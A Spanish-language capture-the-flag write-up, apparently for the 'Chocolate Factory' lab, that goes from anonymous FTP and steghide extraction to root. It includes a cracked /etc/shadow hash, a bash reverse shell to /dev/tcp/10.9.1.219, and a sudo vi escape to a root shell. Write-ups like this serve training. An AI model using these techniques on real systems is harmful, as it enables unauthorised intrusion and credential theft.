PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http

Hay más puertos abiertos pero no son relevantes.

-La web nos pide un usuario y una contraseña

-Podemos entrar a ftp con anonymous, hay una imagen que nos traemos a nuestra máquina.
	ftp> ls
	-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
	ftp> get gum_room.jpg

-Aplicamos estenografía sobre la imagen para ver si contiene un archivo oculto:
steghide extract -sf gum_room.jpg

-sf: Significa "source file", y le está diciendo a steghide que el archivo en el que se ocultaron los datos es gum_room.jpg.

Este comando nos crea un archivo con información en base 64

-Decodificamos la información buscando base64 decodificador en firefox y nos devuelve esto:

He cortado gran parte del contenido porque no es relevante.

Esta información pertenece al archivo /etc/shadow de linux, que almacena contraseñas cifradas de los usuarios.

_rpc:*:18451:0:99999:7:::
statd:*:18451:0:99999:7:::
_gvm:*:18496:0:99999:7:::
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::

-Guardamos la contraseña encriptada de charlie en hash.txt y se lo pasamos a john:
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

contraseña: cn7824

-Utilizamos el usuario charlie y la contraseña cn7824 para entrar en el panel de la web. Nos lleva a una ruta con ejecución remota de comandos.

-Nos mandamos una reverse shell en bash a nuestra máquina:
bash -c 'bash -i >& /dev/tcp/10.9.1.219/1234 0>&1'
www-data@chocolate-factory:/home/charlie$

Estamos dentro como el usuario www-data
-En el directorio /var/www/html encontramos el archivo key_rev_key, que contiene información no legible, lo abrimos con strings y encontramos una key que usaremos más tarde:

strings key_rev_key

congratulations you have found the key:   
b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='

-Navegamos la directorio /home/charlie y encontramos el archivo teleport con una clave privada de ssh.

-Le damos los permisos 0400 y entramos por ssh con el usuario charlie:
chmod 0400 id_rsa
ssh -i id_rsa charlie@10.10.166.167

charlie@chocolate-factory:/$ 

Estamos dentro, esta vez como el usuario charlie. Ya podemos ver el user.txt en /home/charlie/user.txt

cat user.txt
flag{cd5509042371b34e4826e4838b522d2e}

## Escalada de privilegios

Tenemos permisos de sudo sobre el binario vi

charlie@chocolate-factory:/$ sudo -l
User charlie may run the following commands on chocolate-factory:
    (ALL : !root) NOPASSWD: /usr/bin/vi

-Vamos a gtfobins y pegamos el siguiente código:

charlie@chocolate-factory:/$ sudo vi -c ':!/bin/sh' /dev/null

root@chocolate-factory:/# 

-Dentro del directorio /root encontramos el archivo root.py. Para poder ejecutar scripts de python nececitamos instalar la siguiente libreria python3-pip , para ello:

sudo apt update
sudo apt install python3-pip

-Finalmente ejecutamos el script, el cual nos pide una key, que es la que obtuvimos al principio.

python3 root.py            
Enter the key:  -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=

flag{cec59161d338fef787fcb4e296b42124}









